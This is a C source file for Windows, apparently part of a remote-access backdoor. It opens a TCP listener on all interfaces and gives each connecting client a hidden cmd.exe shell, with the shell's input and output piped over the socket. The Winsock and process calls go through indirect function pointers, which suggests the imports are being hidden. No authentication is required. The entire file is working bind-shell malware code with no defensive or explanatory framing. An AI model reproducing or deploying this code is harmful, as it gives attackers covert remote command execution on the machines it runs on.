#include <common.h>
#include <rshell.h>

static WSADATA wsa;
static SOCKET s;
static SOCKADDR_IN sAddr;
static HANDLE serverTh;
static long clientNb;

int rshell_network_init(int port) {
	sAddr.sin_addr.s_addr = INADDR_ANY;
	sAddr.sin_port = (port >> 8) | (port << 8);
	sAddr.sin_family = AF_INET;

	if (fWSAStartup(0x0202, &wsa) != 0) {
		ERR("WSAStartup failed");
		return 1;
	}

	s = fWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (s == INVALID_SOCKET) {
		ERR("WSASocket - Invalid socket (%d)", s);
		fWSACleanup();
		return 1;
	}

	if (fBind(s, (LPSOCKADDR) &sAddr, sizeof(sAddr)) == SOCKET_ERROR) {
		ERR("Bind - Socket Error");
		fWSACleanup();
		return 1;
	}

	return 0;
}

void rshell_network_free() {
	TerminateThread(serverTh, 0);
	fClosesocket(s);
}

static DWORD WINAPI ClientProc(LPVOID lpParam) {
	PROCESS_INFORMATION *pi;
	STARTUPINFO *si;
	DWORD n;
	DWORD i;
	SECURITY_ATTRIBUTES saAttr;
	HANDLE hChildStdinRd, hChildStdinWr, hChildStdoutRd, hChildStdoutWr;
	char msg[8192];

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) return 1;
	SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0);

	if (!CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0)) return 1;
	SetHandleInformation(hChildStdinWr, HANDLE_FLAG_INHERIT, 0);

    pi = (LPPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION));
    si = (LPSTARTUPINFO)malloc(sizeof(STARTUPINFO));

	memset(si, 0, sizeof(STARTUPINFO));
	si->cb = sizeof(STARTUPINFO);
	si->wShowWindow = SW_HIDE;
	si->dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	si->hStdInput = (HANDLE) hChildStdinRd;
	si->hStdOutput = (HANDLE) hChildStdoutWr;
	si->hStdError = (HANDLE) hChildStdoutWr;


	fCreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, si, pi);
	while (WaitForSingleObject(pi->hProcess, 200) != WAIT_OBJECT_0) {
		memset(msg, 0, sizeof(msg));
		PeekNamedPipe(hChildStdoutRd, NULL, 0, NULL, &n, NULL);
		if (n > 0) {
			if (!ReadFile(hChildStdoutRd, msg, sizeof(msg), &n, NULL) || n == 0)
				break;
			i=0;
			while ((i<n) && (msg[i] != 13)) i++;
			if (i<n){
				fSend((SOCKET) lpParam, msg+i, n-i, 0);
			}else
				fSend((SOCKET) lpParam, msg, n, 0);
			if (n == 0)
				break;
		}
		memset(msg, 0, sizeof(msg));
		n = fRecv((SOCKET) lpParam, msg, sizeof(msg), 0);
		if (n > 0){
			if (!WriteFile(hChildStdinWr, msg, n, &n, NULL))
			break;

		}
	}
	INFO("Client go");
	fClosesocket((int) lpParam);
	clientNb--;
	free(si);
	free(pi);
	return 0;
}

static DWORD WINAPI ServerProc(LPVOID lpParam) {
	SOCKET client;
	clientNb = 0;
	if (fListen(s, 5) == SOCKET_ERROR) {
		ERR("Listen - Socket Error");
		fWSACleanup();
		return 1;
	}
	while (1) {
		client = fAccept(s, NULL, NULL );
		if (clientNb < 5) {
			CreateThread(NULL, 0, ClientProc, (LPVOID) client, 0, NULL);
			clientNb++;
		} else
			fShutdown(client, 2);
	}
	return 0;
}

int rshell_network_start() {
	serverTh = CreateThread(NULL, 0, ServerProc, NULL, 0, NULL);
	return 0;
}

